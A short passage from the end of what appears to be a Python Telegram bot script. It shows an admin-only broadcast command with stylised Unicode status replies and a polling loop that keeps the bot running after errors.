                        print(f"𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙪𝙨𝙚𝙧 {user_id}: {str(e)}")
            response = "𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙎𝙚𝙣𝙩 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙏𝙤 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨 👍."
        else:
            response = "🤖 𝙋𝙡𝙚𝙖𝙨𝙚 𝙋𝙧𝙤𝙫𝙞𝙙𝙚 𝘼 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙏𝙤 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
